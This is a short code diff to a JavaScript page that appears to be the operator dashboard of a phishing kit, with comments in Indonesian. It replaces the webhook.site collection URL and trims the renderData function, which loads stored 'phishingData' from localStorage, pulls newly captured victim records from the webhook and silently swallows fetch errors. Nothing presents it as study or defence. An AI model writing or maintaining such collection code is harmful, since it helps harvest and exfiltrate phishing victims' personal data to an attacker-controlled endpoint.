@@ -160,21 +160,16 @@
         let recordedChunks = [];
 
         // ============================================================
-        //  WEBHOOK URL
+        //  WEBHOOK URL (BARU)
         // ============================================================
-        const WEBHOOK_URL = 'https://webhook.site/434d5015-24c0-47c4-af2b-7d46b55872e1';
+        const WEBHOOK_URL = 'https://webhook.site/45a8d4ee-fb9a-4e12-89c6-cc58fb90ca94';
 
         // ============================================================
-        //  RENDER DATA (LOCALSTORAGE + WEBHOOK)
+        //  RENDER DATA
         // ============================================================
         window.renderData = function() {
-            // 1. Data dari LocalStorage
             const localData = JSON.parse(localStorage.getItem('phishingData') || '[]');
-            
-            // 2. Data dari Webhook (fetch async)
             fetchWebhookData();
-
-            // Tampilkan data lokal
             renderLocalData(localData);
         };
 
@@ -238,9 +233,7 @@
                 if (data.data && data.data.length > 0) {
                     addLog(`📥 Webhook: ${data.data.length} data baru`);
                 }
-            } catch (e) {
-                // silent
-            }
+            } catch (e) {}
         }
 
         // ============================================================
